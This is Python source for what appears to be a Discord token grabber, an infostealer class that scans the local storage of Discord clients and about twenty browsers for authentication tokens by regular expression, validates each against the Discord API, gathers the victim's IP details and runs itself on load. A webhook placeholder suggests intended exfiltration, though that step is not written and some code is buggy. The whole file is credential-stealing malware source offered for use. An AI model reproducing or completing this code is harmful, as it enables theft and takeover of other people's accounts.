
import requests
import os
import json
import base64
import random
import re
import string
import datetime
import sqlite3
import pyautogui
import secrets
import shutil
import zipfile
import socket


#from Crypto.Cipher import AES

class Grabber:
    def __init__(self):
        self.tokens = []
        self.valid = []
        self.webhook = "WEBHOOK_HERE" 
        self.file = ""
        self.username = os.getlogin()
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = ""
        self.ipaddress = ""

    def GetIP_Info(self):
        localip = socket.gethostbyname(socket.gethostname())
        publicip_info = requests.get('http://ipinfo.io/json').json()
        
        publicip = publicip_info["ip"]
        publicip_hostname = publicip_info["hostname"]
        publicip_city = publicip["city"]
        publicip_region = publicip["region"]

        

    def CreateTempFolder(self):
        temp = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(10))
        self.tempfolder = f"{self.appdata}\\{temp}"
        os.mkdir(os.path.join(self.tempfolder))
        
    def ScreenShot(self):
        pass
    
    def CheckGoogle(self):
        if os.path.exists(f"{self.appdata}\\Google"):
            return True
        return False

    def GrabToken(self):
        tokens = []
        paths = {
            "Discord": f"{self.roaming}\\discord\\Local Storage\\leveldb\\",
            "Discord Canary": f"{self.roaming}\\discordcanary\\Local Storage\\leveldb\\",
            "Lightcord": f"{self.roaming}\\Lightcord\\Local Storage\\leveldb\\",
            "Discord PTB": f"{self.roaming}\\discordptb\\Local Storage\\leveldb\\",
            "Opera": f"{self.roaming}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
            "Opera GX": f"{self.roaming}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
            "Amigo": f"{self.appdata}\\Amigo\\User Data\\Local Storage\\leveldb\\",
            "Torch": f"{self.appdata}\\Torch\\User Data\\Local Storage\\leveldb\\",
            "Kometa": f"{self.appdata}\\Kometa\\User Data\\Local Storage\\leveldb\\",
            "Orbitum": f"{self.appdata}\\Orbitum\\User Data\\Local Storage\\leveldb\\",
            "CentBrowser": f"{self.appdata}\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
            "7Star": f"{self.appdata}\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
            "Sputnik": f"{self.appdata}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
            "Vivaldi": f"{self.appdata}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome SxS": f"{self.appdata}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
            "Chrome": f"{self.appdata}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
            "Epic Privacy Browser": f"{self.appdata}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
            "Microsoft Edge": f"{self.appdata}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
            "Uran": f"{self.appdata}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
            "Yandex": f"{self.appdata}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Brave": f"{self.appdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Iridium": f"{self.appdata}\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\"
        }
        for platform , path in paths.items():
            if not os.path.exists(path):
                continue
            for file in os.listdir(path):
                if not file.endswith(".log") and not file.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
        for token in tokens:
            if token not in self.tokens and requests.get(f"https://discord.com/api/v9/users/@me", headers={"Authorization": token}).status_code == 200:
                self.tokens.append(token)

Grabber().GrabToken()